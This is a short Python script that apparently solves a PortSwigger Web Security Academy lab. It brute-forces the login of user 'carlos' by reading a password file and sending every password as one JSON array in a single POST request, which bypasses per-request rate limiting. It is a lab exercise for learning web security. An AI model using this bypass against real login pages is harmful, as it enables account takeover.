#https://portswigger.net/academy/labs/launch/dd916d2af3738d723a751992ee4fe00db3c6300559f2e7a5a7efb312d264caa0?referrer=%2fweb-security%2fauthentication%2fpassword-based%2flab-broken-brute-force-protection-multiple-credentials-per-request
import requests
import re
from pathlib import Path

url = f"https://0a9b0078030512e9803ce93d00a3007a.web-security-academy.net"
login_page = url + "/login"

cwd = Path.cwd() 
print("Current Directory:", cwd)
file_path = cwd / "passwords.txt"  # path-to-your-passwords-file

with open(file_path, "r") as f:
    passwords = f.readlines()
for i in range(len(passwords)):
    passwords[i] = passwords[i].rstrip("\n")

data = {
    "username":"carlos",
    "password":passwords
} #it's observed that the post requests accepts a json object instead of separate username password fields 
#in its body, so we try passing all the passwords as a json array and see if the server will process it.
client = requests.sessions.Session()
r = client.get(login_page)
r = client.post(url=login_page, json=data)
print(r.status_code)